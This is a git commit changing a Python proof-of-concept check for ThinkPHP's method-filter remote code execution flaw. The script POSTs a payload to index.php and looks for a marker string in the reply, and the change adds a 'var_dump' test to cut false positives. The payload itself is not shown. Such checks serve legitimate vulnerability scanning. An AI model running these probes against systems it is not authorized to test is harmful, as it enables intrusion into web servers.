c6ad45f58bce56903ded200ab9338c454d0282cc
tr0uble_mAker <71172892+tr0uble-mAker@users.noreply.github.com>
2021-11-28 10:51:36 +0800

    Update thinkphp_method_filter_code_exec.py

--- pocs/framework/thinkphp/thinkphp_method_filter_code_exec.py
+++ pocs/framework/thinkphp/thinkphp_method_filter_code_exec.py
@@ -18,7 +18,7 @@ def thinkphp_method_filter_code_exec(url):
     try:
         vurl = urllib.parse.urljoin(url, 'index.php')
         req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
-        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text:
+        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
             relsult['vulnerable'] = True
             relsult['method'] = 'POST'
             relsult['url'] = vurl
